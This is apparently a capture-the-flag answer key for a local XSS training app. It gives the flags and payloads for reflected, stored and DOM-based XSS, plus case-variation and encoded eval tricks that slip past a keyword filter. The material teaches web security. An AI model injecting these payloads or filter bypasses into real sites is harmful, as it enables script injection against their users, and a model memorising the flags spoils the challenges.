# XSS Walkthroughs

## Challenge 1: Reflected XSS (Easy — 100pts)

**Flag:** `FLAG{reflected_xss_easy_win}`

### Solution
Enter this in the search field:
```html
<script>alert('XSS')</script>
```

Or use an image tag:
```html
<img src=x onerror=alert('XSS')>
```

### How it works
The search term is reflected directly in the HTML without encoding. The browser executes the injected script.

---

## Challenge 2: Stored XSS (Easy — 150pts)

**Flag:** `FLAG{stored_xss_persistent}`

### Solution
Post a guestbook message with:
```
Name: Hacker
Message: <script>alert('Stored XSS')</script>
```

### How it works
The message is stored in the server and displayed to ALL visitors without sanitization. Every time someone views the guestbook, the script executes.

---

## Challenge 3: DOM-Based XSS (Medium — 200pts)

**Flag:** `FLAG{dom_xss_client_side}`

### Solution
Add to the URL:
```
http://localhost:8080/challenges/xss/dom#<img src=x onerror=alert('XSS')>
```

### How it works
The JavaScript reads `location.hash` and writes it to the page using `innerHTML`:
```javascript
document.getElementById('output').innerHTML = 'Hello, ' + location.hash.substring(1);
```
This is entirely client-side — the server never sees the payload.

---

## Challenge 4: XSS Filter Bypass (Hard — 300pts)

**Flag:** `FLAG{xss_f1lter_byp4ss}`

### What's filtered
- `<script`, `</script>`, `alert`, `onerror`, `onload`, `javascript:`

### Solution Options

**Option 1: Case variation**
```html
<img src=x oNeRrOr=confirm(1)>
```

**Option 2: Different event handler**
```html
<body onmouseover=confirm(1)>
```

**Option 3: Different function**
```html
<img src=x oNeRrOr=prompt(1)>
```

**Option 4: eval with encoding**
```html
<img src=x oNeRrOr=eval(atob('YWxlcnQoMSk='))>
```

### How it works
The filter uses simple string replacement, which is case-sensitive and incomplete. Real XSS prevention requires output encoding, not input filtering.
